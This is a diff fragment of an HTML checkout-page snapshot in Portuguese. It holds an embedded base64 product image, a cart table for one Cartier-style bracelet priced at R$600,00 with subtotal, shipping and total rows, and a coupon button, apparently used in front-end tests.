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"></div>
+              </div>
+            </td>
+            <td test-id="product-name-qty">PULSEIRA CARTIER 10MM - 22CM × 1</td>
+            <td class="table-price text-right" width="150px" test-id="product-subtotal"><span>R$&nbsp;600,00</span>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="table-subtotal">
+        <table class="table">
+          <tbody>
+            <tr>
+              <td>Subtotal</td>
+              <td class="text-right" test-id="cart-subtotal">
+                <span>R$&nbsp;600,00</span>
+              </td>
+            </tr>
+            <tr class="table-shipping-cost">
+              <td>Custo de frete </td>
+              <td class="text-right" test-id="cart-shipping-cost">
+                <span>R$&nbsp;00,00</span>
+              </td>
+            </tr>
+          </tbody>
+          <tfoot class="table-footer">
+            <tr>
+              <td class="table-price">Total</td>
+              <td class="text-right table-price" test-id="cart-total">
+                <span>R$&nbsp;600,00</span>
+              </td>
+            </tr>
+          </tfoot>
+        </table>
+      </div>
+      <div class="summary-coupon">
+        <div style="background-color: black;" class="box-discount-coupon-applied">
+          <div class="row"><div class="col-12 text-center">
+            <div  id="" class="btn btn-link" style="text-decoration: none;" tabindex="0" role="button">
+              <span>
+                <svg class="coupon-icon" width="13px" height="13px" viewBox="0 0 1024 1024">
+                  <path d="M992.6,564.8L546.7,41.3C502.1-11,426.5-14,377.9,34.6L34.6,377.9C-14,426.5-11,502.1,41.3,546.6l523.4,445.9 c52.4,44.6,134.2,41.3,182.8-7.3l237.7-237.7C1033.9,699,1037.2,617.1,992.6,564.8z M709.5,802.8c-51.6,0-93.3-41.8-93.3-93.3 c0-51.5,41.8-93.3,93.3-93.3s93.3,41.8,93.3,93.3C802.8,761,761,802.8,709.5,802.8z">
+                  </path>
+                </svg>
+                <span class="text-pre-line">Adicionar cupom de desconto</span>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    </div>
+    </div>
+    </div>
+    </div>
+    </div>
+    </div>
+</body>
 </html>
